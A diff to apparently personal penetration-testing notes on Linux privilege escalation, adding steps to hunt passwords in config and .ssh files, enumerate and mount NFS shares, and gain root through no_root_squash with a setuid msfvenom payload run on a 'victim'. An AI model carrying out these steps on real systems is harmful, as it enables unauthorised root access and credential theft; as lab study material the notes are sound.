@@ -141,6 +141,24 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
 - Look for weak password or re-use passowrd
 - see .bash_history or anything with ```_history```
 - ```cat *history | less```
+- password can be hidden in config file and .ssh file as well.
+
+## NFS
+
+- Show NFS export list
+```showmount -e <target>```
+- Nmap
+```nmap -sV --script=nfs-showmount <target>```
+- Mount an NFS Share
+```mount -o rw,vers=2 <target>:<share> <local_directory>```
+
+
+### no_root_squash
+1. You can view it thru ```cat /etc/exports``` and look for ```no_root_squash``` file
+2. make a mount point with victim ```mount -o rw,vers=2 10.10.14.23:/tmp /tmp/nfs``` this is assuming tmp has no_root_squash.
+3. create reverse shell in the mount directory ```msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf```
+4. run ```chmod +xs /tmp/nfs/shell.elf``` with kali
+5. go to victim shell and run the script ```/tmp/nfs/shell.elf```
 
 ## Kernel Exploit (Last Resort)
 - To enumerate Kernel version ```uname -a```
